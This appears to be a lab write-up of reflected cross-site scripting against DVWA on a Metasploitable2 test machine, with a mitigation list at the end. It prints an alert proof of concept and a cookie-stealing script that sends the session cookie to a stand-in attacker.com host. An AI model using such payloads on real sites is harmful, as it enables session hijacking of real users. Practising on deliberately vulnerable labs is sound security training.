# Metasploitable2 -- Cross-Site Scripting (DVWA)

## Target
- URL: http://192.168.110.3/dvwa/vulnerabilities/xss_r/
- Security level: Low

## What is XSS?
SQL injection goes after the database. XSS goes after the browser.
When a web app takes your input and spits it back on the page without
sanitizing it, you can slip in JavaScript that runs in the victim's
browser. They see nothing. Their browser does your bidding.

## Proof of concept
<script>alert('XSS')</script>
Popup appeared. JavaScript executed. App is cooked.

## Cookie theft demo
<script>alert(document.cookie)</script>
Popped the session cookie right there on screen:
security=low; PHPSESSID=788bd13784a282b9912abffa93f220c4

In a real attack you wouldn't alert it -- you'd ship it quietly
to your own server and use it to hijack the session. No password
needed. You just become them.

## Real attack payload
```javascript
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```
Victim's browser makes a request to attacker server with cookie
in the URL. Attacker grabs it, pastes it into their browser,
refreshes -- and they're in as the victim.

## Defenses
- HttpOnly cookie flag -- JavaScript can't touch the cookie at all
- Input sanitization -- encode <, >, " so they render as text not HTML
- Output encoding -- never trust user input, always encode before display
